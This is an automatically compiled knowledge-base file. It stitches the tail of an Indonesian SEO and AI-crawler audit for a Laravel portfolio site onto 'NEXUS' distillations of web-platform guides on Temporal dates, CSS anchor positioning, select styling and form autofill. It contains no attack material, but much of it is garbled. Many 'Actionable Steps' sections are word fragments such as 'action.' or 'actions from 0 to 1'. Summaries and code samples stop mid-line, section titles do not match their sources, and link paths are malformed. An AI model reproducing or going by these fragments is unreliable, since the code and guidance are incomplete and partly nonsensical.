  "dateModified": "{{ $post->updated_at->toIso8601String() }}",
  "author": { "@id": "https://faisalyusra.my.id/#person" },
  "publisher": { "@id": "https://faisalyusra.my.id/#service" },
  "url": "{{ url()->current() }}",
  "image": "{{ $post->cover_image ?? asset('img/loggo.webp') }}"
}
</script>
@endpush
```

---

### 5. Blog sebagai "DB Publik" yang Bisa Dibaca AI

Supaya konten blog bisa di-consume secara universal oleh AI dan mesin lain:

| Format | Endpoint | Fungsi |
|--------|----------|--------|
| **Sitemap XML** | `/sitemap.xml` | Wajib — yang pertama di-scan AI crawler |
| **JSON Feed** | `/feed.json` | Modern, mudah di-parse AI |
| **RSS Feed** | `/feed.xml` | Standar lama, masih dibaca banyak agregator |
| **Public API** | `/api/posts` | Paling fleksibel, return JSON murni |

**Implementasi di Laravel (routes/web.php):**
```php
// JSON Feed
Route::get('/feed.json', [FeedController::class, 'json']);

// RSS
Route::get('/feed.xml', [FeedController::class, 'rss']);

// Sitemap
Route::get('/sitemap.xml', [SitemapController::class, 'index']);
```

---

## Checklist Pengerjaan

- [ ] Buat `public/llms.txt`
- [ ] Update `public/robots.txt` — tambah AI crawler
- [ ] Tambah FAQ Schema di `service.blade.php` via `@push('schemas')`
- [ ] Tambah Article Schema di halaman blog detail
- [ ] Buat route `/sitemap.xml` dinamis dari DB
- [ ] Buat route `/feed.json` untuk blog
- [ ] (Opsional) Buat route `/api/posts` public

---

## Catatan Penting

> **JSON-LD sudah lengkap** — jangan diubah, sudah best practice.  
> **`@stack('schemas')`** sudah siap — tinggal pakai `@push('schemas')` di tiap view.  
> **Blog** — konten yang dalam dan faktual adalah amunisi utama agar AI mau mengutip websitemu.  
> **llms.txt** bisa dibuat dinamis dari DB supaya selalu up-to-date mengikuti layanan/portofolio terbaru.

---

*Dokumen ini dibuat berdasarkan audit langsung terhadap https://faisalyusra.my.id · Mei 2026*

---
> **METADATA (NEXUS SEMANTIC TAGS)**: [database, ui-ux, performance, vcs, api]

### 📘 KNOWLEDGE: NEXUS_DISTILLATION_TDD.MD

> **VERSION**: v3 | **Last Updated**: 26/05/2026



## 🎓 TDD WISDOM DISTILLATION [v1109] - 26/05/2026
> **Protocol**: Autonomous Intelligence Extraction | **Focus**: Actionable Tech Insights

### 📄 Calculating Event Differentials with Temporal
> **Origin**: `guides/user-experience/[calculate-event-differentials.md](../tdd/NEXUS_CALCULATE-EVENT-DIFFERENTIALS.MD)` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
Calculating the time elapsed between events (such as trial expirations, subscription durations, or prorated costs) has historically been difficult with the legacy `Date` object due to complexities with time zones, daylight saving time (DST), and inconsistent parsing.

The `Temporal` API provides a modern, robust solution for date and time arithmetic. Specifically, `Temporal.ZonedDateTime` and `Temporal.Duration` enable exact, DST-safe calculations of time differences.



To calculate differentials between two events:

1.  **Obtain ZonedDateTime objects**: Convert your inputs (dates and times) into `Temporal.ZonedDateTime` objects. This ensures calculations are time-zone aware.
2.  **Calculate active time with `.since()`**: Use `currentZonedDateTime.since(startZonedDateTime)` to find the time elapsed since a start event.
3.  **Calculate remaining time with `.until()`**: Use `currentZonedDateTime.until(endZonedDateTime)` to find the time remaining until a future event.
4.  **Control precision with options**: Use `largestUnit`, `smallestUnit`, and `roundingMode` to control how the resulting duration is balanced and rounded.



```javascript
// 1. Get current time point...

#### 🔗 Traceability:
- [Source Context]([calculate-event-differentials.md](../tdd/NEXUS_CALCULATE-EVENT-DIFFERENTIALS.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Capturing Location-Agnostic Data with Temporal
> **Origin**: `guides/user-experience/[capture-location-agnostic-data.md](../tdd/NEXUS_CAPTURE-LOCATION-AGNOSTIC-DATA.MD)` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
Recording chronological data that should remain identical regardless of the viewer's location (such as birthdates, recurring alarms, or national holidays) has historically been error-prone with the legacy `Date` object. Because `Date` objects always represent a specific instant in time and are tied to a time zone, saving a date like "1990-01-01" can result in users in different time zones seeing "1989-12-31" due to offset shifts.

The `Temporal` API introduces "Plain" types—such as `Temporal.PlainDate` and `Temporal.PlainTime`—which have no concept of a time zone. These types represent calendar dates and wall-clock times exactly as you would read them off a calendar or a clock, making them ideal for location-agnostic data.



To capture and display location-agnostic data:

1.  **Use `Temporal.PlainDate` for dates**: For data like birthdates or holidays, use `Temporal.PlainDate.from()` to create an instance from an ISO 8601 string or an object.
2.  **Use `Temporal.PlainTime` for times**: For data like a daily alarm or a preferred lunch time, use `Temporal.PlainTime.from()`.
3.  **Display without conversion**: Since these objects are time-zone unaware, they will display the...

#### 🔗 Traceability:
- [Source Context]([capture-location-agnostic-data.md](../tdd/NEXUS_CAPTURE-LOCATION-AGNOSTIC-DATA.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Creating a stagger animation
> **Origin**: `guides/user-experience/[dynamic-sibling-animations.md](../tdd/NEXUS_DYNAMIC-SIBLING-ANIMATIONS.MD)` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions.

#### 🔗 Traceability:
- [Source Context]([dynamic-sibling-animations.md](../tdd/NEXUS_DYNAMIC-SIBLING-ANIMATIONS.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Formatting Human-Readable Durations with Temporal
> **Origin**: `guides/user-experience/[format-human-readable-durations.md](../tdd/NEXUS_FORMAT-HUMAN-READABLE-DURATIONS.MD)` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
Presenting elapsed time or durations to users in a readable format (e.g., "1 hour and 30 minutes") has historically required manual math or external libraries. The `Temporal` API's `Temporal.Duration` class simplifies this by providing structured duration objects and powerful "balancing" capabilities via the `round()` method.



To format a duration:

1.  (**MANDATORY**) **Create a Duration**: Use `Temporal.Duration.from()` to create a duration object from a set of units.
2.  (**OPTIONAL**) **Apply Balancing**: Use the `round()` method with the `largestUnit` option to control how units are balanced. For example, to convert 90 minutes into hours and minutes, or to keep it as total minutes.
3.  (**MANDATORY**) **Build the Display String**: Access the specific unit properties (like `.hours`, `.minutes`) to construct the human-readable string manually, or **(Recommended)** use `Intl.DurationFormat` for a localized, automatic approach.



```javascript
// 1. Create a duration (e.g., from user input)
const duration = Temporal.Duration.from({ minutes: 90 });

// 2. Balance to hours (converts 90 minutes to 1 hour and 30 minutes)
const balanced = duration.round({ largestUni...

#### 🔗 Traceability:
- [Source Context]([format-human-readable-durations.md](../tdd/NEXUS_FORMAT-HUMAN-READABLE-DURATIONS.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 How to implement
> **Origin**: `guides/user-experience/[interest-triggered-action-previews.md](../tdd/NEXUS_INTEREST-TRIGGERED-ACTION-PREVIEWS.MD)` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions before they commit to them. Interest invokers are an experimental web platform feature that provides a declarative-based way of creating interest relationships between an interest source (i.e. a button or a link) and an interest target. Once the declarative relationship has been established there are a number of methods a developer can respond to based on interest and loss of interest using both CSS and JavaScript. For this use case, we can leverage the `interest` and `loseinterest` events to preview various effects for an interest target.

#### 🔗 Traceability:
- [Source Context]([interest-triggered-action-previews.md](../tdd/NEXUS_INTEREST-TRIGGERED-ACTION-PREVIEWS.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 The problem
> **Origin**: `guides/user-experience/[position-aware-tooltips.md](../tdd/NEXUS_POSITION-AWARE-TOOLTIPS.MD)` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
When building tooltips or popovers with CSS Anchor Positioning, the browser can automatically "flip" the element to a fallback position if it would otherwise overflow the viewport. When this happens, you may want to adjust the style of the positioned content, for instance to reposition an arrow that points from the positioned content to the anchor.

**Anchored Container Queries** solve this by allowing you to query the active positioning state of an element and apply styles accordingly.



Imagine a tooltip that appears above its anchor by default. It has a "down" arrow at the bottom. If the user scrolls and the tooltip flips to appear *below* the anchor, the arrow is now pointing the wrong way and is on the wrong side of the tooltip.



By setting `container-type: anchored` on your positioned element, you turn it into a query container that knows about its own anchor-positioned state. You can then use the `@container anchored()` query to update its descendants or pseudo-elements.



Use the Popover API to create a tooltip. This creates an implicit anchor connection that can be used for positioning.

```html
<button popovertarget="tooltip" id="anchor" aria-describe...

#### 🔗 Traceability:
- [Source Context]([position-aware-tooltips.md](../tdd/NEXUS_POSITION-AWARE-TOOLTIPS.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [database, tdd, vcs, api]

### 📘 KNOWLEDGE: NEXUS_DISTILLATION_UI-UX.MD

## 🎓 UI-UX WISDOM DISTILLATION [v3923] - 26/05/2026
> **Protocol**: Autonomous Intelligence Extraction | **Focus**: Actionable Tech Insights

### 📄 Accessible Error Announcement
> **Origin**: `ui-ux/NEXUS_ACCESSIBLE-ERROR-ANNOUNCEMENT.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action has occurred.

#### 🔗 Traceability:
- [Source Context](NEXUS_ACCESSIBLE-ERROR-ANNOUNCEMENT.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation
> **Origin**: `ui-ux/NEXUS_ANIMATE-TO-FROM-TOP-LAYER.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v4 | **Last Updated**: 26/05/2026

Elements that render in the "top layer" (like `<dialog>`, elements with the `popover` attribute, or tooltips) have historically been difficult to animate because they toggle between `display: none` and a visible state. Modern CSS provides `@starting-style`, `transition-behavior: allow-discrete`, and the `overlay` property to enable smooth entry and exit transitions for these elements. Note that native CSS nesting is used in the examples below.





To animate the `display` property, you must set `transition-behavior: allow-discrete`. This allows the element to remain visible during its exit transition. If using transition shorthands, be sure to place the `transition-behavior: allow-discrete` afterwards to prevent the shorthand from negating it.



When an element moves in or out of the top layer, it must transition the `overlay` property. This ensures the element stays in the top layer for the duration of the animation, preventing it from being clipped by other elements or the viewport prematurely.



Use the `@starting-style` at-rule to define the styles an element should transition *from* when it is first rendered or...

#### 🔗 Traceability:
- [Source Context](NEXUS_ANIMATE-TO-FROM-TOP-LAYER.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Animate to Intrinsic Sizes
> **Origin**: `ui-ux/NEXUS_ANIMATE-TO-INTRINSIC-SIZES.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action (e.g., `:hover` or a state class).
4.  **Perform calculations (Optional)**: Use `calc-size()` if you need to perform math on an intrinsic size (e.g., `auto + 2rem`). `calc-size()` also supports the `any` keyword for basis-agnostic calculations.

#### 🔗 Traceability:
- [Source Context](NEXUS_ANIMATE-TO-INTRINSIC-SIZES.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Animated Select Picker
> **Origin**: `ui-ux/NEXUS_ANIMATED-SELECT-PICKER.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The customizable select API offers a declarative, CSS-driven way to animate `<select>` elements and their dropdown pickers. By combining `appearance: base-select` with modern CSS animation techniques—such as `@starting-style` and the `allow-discrete` transition behavior—you can create fluid, premium UI transitions for top-layer elements without relying on heavy JavaScript libraries.

Previously, animating native select dropdowns was impossible because their UI was rendered outside the accessible viewport constraints. With `appearance: base-select`, the picker becomes styleable and animatable like any other page element.



To implement an animated select picker:

1. **Opt-in to customization:** Apply `appearance: base-select` to both the `<select>` element and the `::picker(select)` pseudo-element.
2. **Enable auto-sizing transitions (Optional):** Define `interpolate-size: allow-keywords` (usually on `:root`) to allow the browser to transition between discrete metric values like `height: auto` and `height: 0`.
3. **Animate the top-layer container:** Apply standard entry/exit styles to `::picker(select)`. To make sure th...

#### 🔗 Traceability:
- [Source Context](NEXUS_ANIMATED-SELECT-PICKER.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Apply WebGL shaders to HTML content
> **Origin**: `ui-ux/NEXUS_APPLY-WEBGL-SHADERS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
Action</button>
  </div>
</canvas>

<script>
  const canvas = document.getElementById("canvas");
  const gl = canvas.getContext("webgl");
  const uiElement = document.getElementById("ui-element");

  // Setup WebGL texture...
  const texture = gl.createTexture();
  gl.bindTexture(gl.TEXTURE_2D, texture);

  canvas.onpaint = () => {
    // 1. Update texture with HTML content
    if (gl.texElementImage2D) {
      gl.texElementImage2D(
        gl.TEXTURE_2D,
        0,
        gl.RGBA,
        gl.RGBA,
        gl.UNSIGNED_BYTE,
        uiElement,
      );
    }

    // ... Render your 3D scene here, calculating htmlElementMVP matrix ...

    // 2. Sync DOM position with 3D scene
    if (canvas.getElementTransform) {
      const mvpDOM = new DOMMatrix(Array.from(h

#### 🔗 Traceability:
- [Source Context](NEXUS_APPLY-WEBGL-SHADERS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Build an address form that follows best practice
> **Origin**: `ui-ux/NEXUS_AUTOFILL-ADDRESS-FORM.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action that shows progress and makes the next step obvious. For example, label the submit button on your delivery address form **Proceed to Payment** rather than **Continue** or **Save**.

#### 🔗 Traceability:
- [Source Context](NEXUS_AUTOFILL-ADDRESS-FORM.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Use the CSS :autofill pseudo-class to highlight form fields that have been autofilled by the browser and not edited by the user
> **Origin**: `ui-ux/NEXUS_AUTOFILL-HIGHLIGHT-INPUTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Use the CSS `:autofill` to highlight fields that have (or have not been) autofilled, to help guide the user to successful form completion.



To highlight a form field that has been autofilled by the browser (and not edited by the user) add a selector to your CSS using the `:autofill` class. This can be used for an `<input>`, `<select>`, or `<textarea>` element.

When styling autofilled states, you must adhere to accessibility best practices:
- **Multiple State Indicators**: Do not rely on border color alone to indicate the autofilled state. Use multiple indicators such as border thickness and custom background shading to ensure the state is perceivable.
- **Preserve Focus Indicators**: Never remove focus outlines (`outline: none`) without providing a clear, high-contrast replacement for keyboard users.

The following example uses `:autofill` to set a custom border and background, along with explicit focus styles:

```css
input:autofill,
input:-webkit-autofill {
  /* Multiple indicators: use both a distinct border and background color via box-shadow to avoid color-only state */
  border: 2px solid #2e7d32;
  box-...

#### 🔗 Traceability:
- [Source Context](NEXUS_AUTOFILL-HIGHLIGHT-INPUTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Build a payment form that follows best practice
> **Origin**: `ui-ux/NEXUS_AUTOFILL-PAYMENT-FORM.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action that shows progress and makes the next step obvious. For example, label the submit button on your delivery address form **Proceed to Payment** rather than **Continue** or **Save**.

#### 🔗 Traceability:
- [Source Context](NEXUS_AUTOFILL-PAYMENT-FORM.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Build a sign-in form that follows best practice
> **Origin**: `ui-ux/NEXUS_AUTOFILL-SIGN-IN-FORM.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Use cross-platform browser features to build sign-in forms that are secure, accessible and easy to use.

If users ever need to sign in to your site, then good sign-in form design is critical. This is especially true for people on poor connections, on mobile, in a hurry, or under stress. Poorly designed sign-in forms get high bounce rates. Each bounce could mean a lost customer and a disgruntled user—not just a missed sign-in opportunity.



Outlined below are the most important guidelines for building successful sign-in forms.



Make the most of the elements and attributes built for creating forms:

- `<form>`, `<input>`, `<label>`, and `<button>`
- `type`, `autocomplete`, and `inputmode`

These enable built-in browser functionality, improve accessibility, and add meaning to markup.



To label an `<input>`, `<select>`, or `<textarea>`, use a `<label>`. Associate a label with an input by giving the label's `for` attribute the same value as the input's `id`.



Make it easy for users to enter data, by using the appropriate `<input>` element `<type>` attribute to provide the right keyboard on mobile and enab...

#### 🔗 Traceability:
- [Source Context](NEXUS_AUTOFILL-SIGN-IN-FORM.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Build a sign-up form that follows best practice
> **Origin**: `ui-ux/NEXUS_AUTOFILL-SIGN-UP-FORM.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Use cross-platform browser features to build sign-up forms that are secure, accessible and easy to use.

If users ever need to sign up to your site, then good sign-up form design is critical. This is especially true for people on poor connections, on mobile, in a hurry, or under stress. Poorly designed sign-up forms get high bounce rates. Each bounce could mean a lost customer and a disgruntled user—not just a missed sign-up opportunity.



Outlined below are the most important guidelines for building successful sign-up forms.



Make the most of the elements and attributes built for creating forms:

-   `<form>`, `<input>`, `<label>`, and `<button>`
-   `type`, `autocomplete`, and `inputmode`

These enable built-in browser functionality, improve accessibility, and add meaning to markup.



To label an `<input>`, `<select>`, or `<textarea>`, use a `<label>`. Associate a label with an input by giving the label's `for` attribute the same value as the input's `id`.



Make it easy for users to enter data, by using the appropriate `<input>` element `<type>` attribute to provide the right keyboard on mobile and ...

#### 🔗 Traceability:
- [Source Context](NEXUS_AUTOFILL-SIGN-UP-FORM.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Brand-Consistent Forms
> **Origin**: `ui-ux/NEXUS_BRAND-CONSISTENT-[FORMS.MD](../security/NEXUS_FORMS.MD)` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



Customizing standard HTML form elements like checkboxes and radio buttons has historically been difficult. Developers often faced a choice between using the browser defaults or building custom components from scratch. Building custom controls is time-consuming and can easily lead to accessibility issues or missing states (like the indeterminate state for checkboxes).

The CSS property `accent-color` provides a simple way to bring your brand color to built-in HTML form inputs with a single line of CSS, without sacrificing accessibility or built-in browser features.



To apply your brand color to form controls:

1. **Identify your brand color:** Choose a color that represents your brand.
2. **Apply the `accent-color` property:** Add `accent-color` to the element or a container element (like `body` or a specific form) in your CSS.
3. **Support Dark Mode (Optional but Recommended):** Use `color-scheme` to let the browser know your site supports dark mode, and adjust the `accent-color` if necessary for better contrast.



```css
:root {
  --brand-color: #6200ee;
}

/* Apply accent-color to the body or a specific co...

#### 🔗 Traceability:
- [Source Context](NEXUS_BRAND-CONSISTENT-[FORMS.MD](../security/NEXUS_FORMS.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Branded Select Styling
> **Origin**: `ui-ux/NEXUS_BRANDED-SELECT-STYLING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The customizable select API offers a declarative, CSS-driven way to style `<select>` elements to perfectly match your brand's design system. By opting into `appearance: base-select`, you gain access to the internal shadow DOM of the select element, allowing you to style the button, the options picker list, the arrow icon, and the checkmark indicator using standard CSS properties.

Previously, achieving a fully branded select required rebuilding the control from scratch with JavaScript, which often broke accessibility, keyboard navigation, and native form integration. With `appearance: base-select`, you get a custom look while the browser handles focus management, top-layer rendering, and accessibility bindings.



To implement branded select styling:

1. **Opt-in to customization:** Apply `appearance: base-select` to both the `<select>` element and the `::picker(select)` pseudo-element (which targets the drop-down list of options).
2. **Structure the custom button (Optional):** Define a `<button>` element directly inside the `<select>` to replace the default trigger. Use the `<selectedcontent>` element inside this button...

#### 🔗 Traceability:
- [Source Context](NEXUS_BRANDED-SELECT-STYLING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Breaking up long tasks
> **Origin**: `ui-ux/NEXUS_BREAK-UP-LONG-TASKS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Heavy computations or long loops can block the main thread, causing the page to become unresponsive. To prevent this, you should yield control back to the browser periodically. The `scheduler.yield()` API allows you to pause a long task and let the browser handle user input or rendering before continuing.



Use `scheduler.yield()` inside async functions to break up work.

```javascript
async function processLargeArray(items) {
  // DO: Set a time-based deadline 50 milliseconds into the future. 50
  // milliseconds is the boundary for when a task becomes a long task.
  let deadline = performance.now() + 50; // 50ms budget

  for (const item of items) {
    // Process the item
    processItem(item);
    
    // MANDATORY: Yield to the main thread periodically to keep the UI
    // responsive. This can be done by checking if the deadline set earlier
    // has been exceeded. When it has been, yield, then reset the deadline
    // another 50 milliseconds into the future.
    if (performance.now() >= deadline) {
      await scheduler.yield();
      deadline = performance.now() + 50;
    }
  }
}
```



Sched...

#### 🔗 Traceability:
- [Source Context](NEXUS_BREAK-UP-LONG-TASKS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Core implementation
> **Origin**: `ui-ux/NEXUS_CAROUSEL-SNAP-HIGHLIGHTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Scroll-state container queries allow you to style elements based on their current scroll state, such as whether an element is "stuck" (via sticky positioning) or "snapped" (via scroll snapping). This enables carousel or gallery experiences where the active item can be visually distinguished without relying on JavaScript intersection observers or scroll event listeners.



To highlight snapped items, you must establish a scroll-snap container, define the snap targets as scroll-state containers, and then query that state to style descendants.


The parent container must have `scroll-snap-type` enabled.

```html
<div class="carousel">
  <div class="carousel-item">
    <div class="card">Product 1 content</div>
  </div>
  <div class="carousel-item">
    <div class="card">Product 2 content</div>
  </div>
</div>
```

```css
.carousel {
  display: flex;
  overflow-x: auto;
  /* MANDATORY: Enable scroll snapping on the container */
  scroll-snap-type: x mandatory;
}
```


Each item in the carousel that should be tracked for snapping must be declared as a `scroll-state` container.

```css
.carousel-item {
  /...

#### 🔗 Traceability:
- [Source Context](NEXUS_CAROUSEL-SNAP-HIGHLIGHTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementing state-based container styling
> **Origin**: `ui-ux/NEXUS_CHILD-STATE-BASED-STYLING.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions, such as a localized theme toggle reacting to a checkbox (`:checked`), a form group highlighting an error (`:invalid`), or a card elevating when a child link is focused (`:focus-within`).

#### 🔗 Traceability:
- [Source Context](NEXUS_CHILD-STATE-BASED-STYLING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overview
> **Origin**: `ui-ux/NEXUS_COMPLEX-SHAPES.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions from `0` to `1` (like `0.5` for 50%) instead of absolute pixels.

> **Luminance vs. Alpha Masking**: By default, SVG masks use **luminance** (brightness) to determine opacity, where white reveals, black hides, and gray creates semi-transparency. If you want the mask to use the **alpha channel** (transparency) of your SVG shapes instead, you can specify `mask-type: alpha;` in your CSS or `mask-type="alpha"` directly on the SVG `<mask>` element.

```html
<!-- White areas reveal content, gray creates semi-transparency, black or transparent hides it -->
<svg width="0" height="0">
  <defs>
    <!-- objectBoundingBox scales mask coordinates (0 to 1) with the element's size -->
    <mask id="custom-shape" maskContentUnits="objectBoundingBox">
      <!-- Use white shapes to defin

#### 🔗 Traceability:
- [Source Context](NEXUS_COMPLEX-SHAPES.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Component-specific light/dark themes
> **Origin**: `ui-ux/NEXUS_COMPONENT-SPECIFIC-LIGHT-DARK-THEME.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



While more commonly set on the root, the `color-scheme` property can be set on individual elements to force them into a different color scheme from the rest of the page.
This can be useful for components that must always be viewed in a specific color scheme (e.g. always in dark or light mode).

Example use cases include:
- Elements that are often in dark mode even on light mode pages for aesthetic reasons, e.g. code blocks, media players, photo galleries
- Areas that contain media designed for a light background (e.g. images, videos, illustrations, print previews) can be set to light mode even if the rest of the page is in dark mode.
- Elements whose color-scheme is controlled by a user-level setting, such as component previews
- Embeds that don't support both light and dark modes
- Design tools, maps, visualizations, games etc.



Not every element that uses lighter text on darker background in light mode or darker text on lighter background in dark mode needs a different `color-scheme`.
For example, a primary button may be rendered as blue with white text in light mode, but that does not warrant a `color-scheme: da...

#### 🔗 Traceability:
- [Source Context](NEXUS_COMPONENT-SPECIFIC-LIGHT-DARK-THEME.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Consistent Cross-Document Transitions
> **Origin**: `ui-ux/NEXUS_CONSISTENT-[CROSS-DOCUMENT-TRANSITIONS.MD](../other/NEXUS_CROSS-DOCUMENT-TRANSITIONS.MD)` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026





Cross-document view transitions animate elements between two pages during a same-origin navigation. The browser captures a snapshot of the old page, navigates, then animates from the snapshot to the new page. If the new page has not finished loading critical resources — stylesheets, layout scripts, or key DOM elements — the transition animates to an incomplete or unstyled state. This causes visual glitches such as elements morphing to wrong positions, content reflowing mid-animation, or fallback fonts flashing to web fonts after the transition completes.



Use `blocking="render"` on critical `<link>` and `<script>` elements in the new page's `<head>`, and use `<link rel="expect">` to block rendering until specific DOM elements have been parsed. This ensures the browser does not begin the view transition animation until the new page's visual state is stable. The browser continues parsing the HTML in the background — only painting is deferred.



1. **MANDATORY:** Opt in to cross-document view transitions with the `@view-transition` CSS at-rule on both pages.
2. **MANDATORY:** Ensure critical stylesheets are in the `<...

#### 🔗 Traceability:
- [Source Context](NEXUS_CONSISTENT-[CROSS-DOCUMENT-TRANSITIONS.MD](../other/NEXUS_CROSS-DOCUMENT-TRANSITIONS.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementing content-based container styling
> **Origin**: `ui-ux/NEXUS_CONTENT-BASED-STYLING.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026

Historically, applying different layouts to a component based on its content required either JavaScript or conditional logic in your HTML templating language to inject modifier classes (like `.card--has-image` or `.card--text-only`).

The `:has()` pseudo-class eliminates this need by acting as a parent selector. It allows you to conditionally style a container element based on the presence or absence of specific descendant elements.

Using `:has()`, you can easily define distinct layout variations entirely in CSS based on a component's actual DOM content. You can also optionally combine it with `:not()` to explicitly target the *absence* of content to define default layouts.



**MANDATORY**: You must use the `:has()` selector on the container element to detect the presence of specific child content.

To build a component that changes its layout based on its content:

1. **Define the default styling**: Apply the base layout styles to the container element (e.g., a simple single-column stack).
2. **Apply content-based overrides**: Target the container with `:has([child-selector])` and apply the new layout styles for when...

#### 🔗 Traceability:
- [Source Context](NEXUS_CONTENT-BASED-STYLING.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Custom Select Picker Layouts
> **Origin**: `ui-ux/NEXUS_CUSTOM-SELECT-PICKER-LAYOUTS.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



"Custom Select Picker Layouts" allow developers to break away from the traditional vertical list of options in a `<select>` dropdown. Using `appearance: base-select` and the `::picker(select)` pseudo-element, you can style the options list using modern CSS layout techniques like Grid or Flexbox. This is ideal for color pickers, emoji selectors, or product variants where a visual menu is more effective than a list.

The CSS property `appearance: base-select` unlocks the ability to style the internal parts of a `<select>` element. By targeting `select::picker(select)`, you can apply `display: grid` and position options in columns, creating a rich visual experience without custom JavaScript.



To implement a custom select picker layout:

1. **Activate Base Styling:** Apply `appearance: base-select` to both the `<select>` element and its internal picker pseudo-element `select::picker(select)`.
2. **Style the Picker Container:** Target `select::picker(select)` and apply `display: grid` (or `display: flex`). Define columns and gaps as you would for any container.
3. **Style Options:** Target the `<option>` elements to style ...

#### 🔗 Traceability:
- [Source Context](NEXUS_CUSTOM-SELECT-PICKER-LAYOUTS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Overview
> **Origin**: `ui-ux/NEXUS_DECLARATIVE-DIALOG-POPOVER-CONTROL.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action) attributes to a `<button>`, the browser automatically handles open/close state changes, focus management, and accessibility bindings (such as `aria-expanded`). This declarative approach is recommended because it removes brittle boilerplate code, ensures interactions are functional immediately upon HTML parsing, and guarantees a robust, natively accessible user experience.

#### 🔗 Traceability:
- [Source Context](NEXUS_DECLARATIVE-DIALOG-POPOVER-CONTROL.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Defer rendering heavy content
> **Origin**: `ui-ux/NEXUS_DEFER-RENDERING-HEAVY-CONTENT.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions. Modern web technologies allow you to defer the rendering workload for content that is not immediately visible, significantly boosting performance without breaking accessibility or user expectations.

To optimize rendering, you can utilize the CSS `content-visibility` property and the HTML `hidden="until-found"` attribute. While both aid performance, they serve distinct use cases.

#### 🔗 Traceability:
- [Source Context](NEXUS_DEFER-RENDERING-HEAVY-CONTENT.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Defer Work Until Scroll Ends
> **Origin**: `ui-ux/NEXUS_DEFER-WORK-UNTIL-SCROLL-ENDS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
actions if you're building carousels or testimonial galleries slides.
- **DO NOT** bundle layout-dependent dynamic updates inside dynamic visual scroll callbacks.
- **DO** consider that visual viewport zooming and scrolling triggers the `scrollend` event correctly.

#### 🔗 Traceability:
- [Source Context](NEXUS_DEFER-WORK-UNTIL-SCROLL-ENDS.MD)
